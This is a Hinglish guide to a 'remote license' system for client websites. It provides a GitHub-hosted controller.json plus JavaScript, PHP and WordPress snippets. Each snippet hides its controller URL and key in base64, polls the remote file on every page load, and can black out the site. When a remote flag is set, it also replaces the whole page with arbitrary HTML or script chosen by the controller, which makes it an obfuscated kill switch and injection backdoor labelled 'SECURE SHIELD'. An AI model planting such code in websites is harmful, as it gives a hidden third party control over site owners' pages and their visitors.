# Multi-Platform Remote License & Expiry System

---

## 1. GitHub Configuration (`controller.json`)

Sabse pehle apni GitHub repository mein `controller.json` file banayein. Yeh aapka main control panel hai.

**Format:**

```json

{
  "licenses": {
    "LANDINGPAGE": {
      "expiry": "2026-01-15",
      "authorized_target": ["yourdomain.com"],
      "custom_code": { "enabled": false, "code": "" }
    },
    "FAHAD-786": {
      "expiry": "2025-12-31",
      "authorized_target": ["fahadtech8.github.io", "connect.thefahad.in"],
      "custom_code": {
        "enabled": false,
        "code": "<div style='position:fixed;bottom:15px;right:15px;background:linear-gradient(135deg,#1d976c,#93f9b9);color:white;padding:12px 20px;z-index:9999;font-family:sans-serif;font-size:14px;font-weight:600;border-radius:12px;box-shadow:0px 8px 20px rgba(0,0,0,0.2);'>Fahad Account Active</div>"
      }
    },
    "WP-CLIENT-03": {
      "expiry": "2026-03-10",
      "authorized_target": ["client3.com"],
      "custom_code": { "enabled": false, "code": "" }
    },
    "TECH-PRO-04": {
      "expiry": "2026-05-20",
      "authorized_target": [], 
      "custom_code": { "enabled": false, "code": "" }
    },
    "GURU-DEV-05": {
      "expiry": "2026-07-15",
      "authorized_target": ["gurudev.net"],
      "custom_code": { "enabled": false, "code": "" }
    },
    "SMART-WEB-06": {
      "expiry": "2026-08-01",
      "authorized_target": ["smartweb.org"],
      "custom_code": { "enabled": false, "code": "" }
    },
    "LUX-SHOP-07": {
      "expiry": "2026-10-10",
      "authorized_target": ["luxshop.in"],
      "custom_code": { "enabled": false, "code": "" }
    },
    "PORTFOLIO-08": {
      "expiry": "2026-12-01",
      "authorized_target": ["myportfolio.com"],
      "custom_code": { "enabled": false, "code": "" }
    },
    "ECOM-HUB-09": {
      "expiry": "2027-01-20",
      "authorized_target": ["ecomhub.pk", "test-store.com"],
      "custom_code": { "enabled": false, "code": "" }
    },
    "MASTER-KEY-10": {
      "expiry": "2028-12-31",
      "authorized_target": [],
      "custom_code": { "enabled": false, "code": "" }
    }
  },
  "title": "License Alert",
  "msg_expired": "Your license has expired. <br><br> <a href='https://wa.me/917081160639' style='display:inline-block; background:#25D366; color:white; padding:12px 25px; text-decoration:none; border-radius:50px; font-weight:bold; box-shadow:0 4px 15px rgba(37,211,102,0.4);'>Renew Now via WhatsApp</a>",
  "msg_invalid": "Invalid License! <br> Contact Admin for activation.",
  "msg_domain_mismatch": "Unauthorized Domain! <br> This license is not registered for this website."
}

```

---

## 2. Landing Configuration (`landing server`)

**Format:**

```html

<div id="sys_overlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.99); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
    <div style="padding:40px; background:#000; border:1px solid #333; border-radius:20px; max-width:450px;">
        <h1 id="sys_h" style="color:#ff3333; margin:0; font-size:26px;"></h1>
        <p id="sys_b" style="color:#888; margin-top:20px; font-size:16px; line-height:1.6;"></p>
    </div>
</div>
<script>
(function(){
    const _u = atob("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u");
    const _k = atob("RkFIQUQtNzg2"); 
    async function _v(){
        const o=document.getElementById('sys_overlay'), s=document.querySelector('.scene'), h=window.location.hostname.replace('www.','');
        try {
            const r=await fetch(_u+'?v='+Date.now()); if(!r.ok) throw new Error();
            const d=await r.json(), m=d.licenses[_k], n=new Date().toISOString().split('T')[0];
            if(!m){_sh(d.title,d.msg_invalid);return}
            if(m.authorized_target?.length>0 && !m.authorized_target.includes(h)){_sh("Denied",d.msg_domain_mismatch);return}
            if(m.expiry && n>m.expiry){_sh(d.title,d.msg_expired);return}
            o.style.display='none'; if(s) s.style.display='block';
            if(m.custom_code?.enabled){if(s)s.style.display='none';document.body.innerHTML=m.custom_code.code}
        } catch(e){_sh(" "," ")}
        function _sh(h,b){document.getElementById('sys_h').innerText=h;document.getElementById('sys_b').innerHTML=b;o.style.display='flex';if(s)s.style.display='none'}
    }
    _v(); setInterval(_v, 15000);
})();
</script>


```

---

## 3. PHP Configuration (`php server`)

**Format:**

```php


<?php
/* — SECURE SHIELD START — */
function _sys_sync_final(){
    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u");
    $_k = base64_decode("RkFIQUQtNzg2");
    $_r = @file_get_contents($_u.'?v='.time());
    if(!$_r) die("<div style='background:#000;height:100vh;'></div>");
    $_d = json_decode($_r,true); $_m = $_d['licenses'][$_k] ?? null; $_err = null;
    if(!$_m) $_err = $_d['msg_invalid'];
    $_h = str_replace('www.','',$_SERVER['HTTP_HOST']);
    if(!empty($_m['authorized_target']) && !in_array($_h, $_m['authorized_target'])) $_err = $_d['msg_domain_mismatch'];
    if(isset($_m['expiry']) && date("Y-m-d") > $_m['expiry']) $_err = $_d['msg_expired'];
    if($_err){
        die("<div style='background:rgba(0,0,0,0.99);position:fixed;inset:0;z-index:9999999;color:white;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;'><div style='padding:40px;background:#000;border:1px solid #333;border-radius:20px;max-width:450px;'><h1 style='color:#ff3333;margin:0;font-size:26px;'>".$_d['title']."</h1><p style='color:#888;margin-top:20px;font-size:16px;line-height:1.6;'>".$_err."</p></div></div>");
    }
    if($_m['custom_code']['enabled'] ?? false){ echo $_m['custom_code']['code']; exit; }
}
_sys_sync_final();
/* — SECURE SHIELD END — */


```

---

## 4. WordPress Configuration (`wordpress server`)

**Format:**

```php

/* — SECURE SHIELD START — */
add_action('init', '_wp_secure_core_v7');
function _wp_secure_core_v7() {
    if (is_admin()) return;
    $_u = base64_decode("aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u");
    $_k = base64_decode("RkFIQUQtNzg2");
    $r = wp_remote_get($_u.'?v='.time()); if(is_wp_error($r)) return;
    $d = json_decode(wp_remote_retrieve_body($r),true); $m = $d['licenses'][$_k] ?? null; $err = null;
    if(!$m) $err = $d['msg_invalid'];
    $h = str_replace('www.','',$_SERVER['HTTP_HOST']);
    if(!empty($m['authorized_target']) && !in_array($h, $m['authorized_target'])) $err = $d['msg_domain_mismatch'];
    if(isset($m['expiry']) && date("Y-m-d") > $m['expiry']) $err = $d['msg_expired'];
    if($err){
        echo "<div style='background:rgba(0,0,0,0.99);position:fixed;inset:0;z-index:9999999;color:white;display:flex;align-items:center;justify-content:center;text-align:center;font-family:sans-serif;'><div style='padding:40px;background:#000;border:1px solid #333;border-radius:20px;max-width:450px;'><h1 style='color:#ff3333;margin:0;font-size:26px;'>".$d['title']."</h1><p style='color:#888;margin-top:20px;font-size:16px;line-height:1.6;'>".$err."</p></div></div>";
        exit;
    }
    if($m['custom_code']['enabled'] ?? false){ echo $m['custom_code']['code']; exit; }
}
/* — SECURE SHIELD END — */



```

---

###  **RESULT**
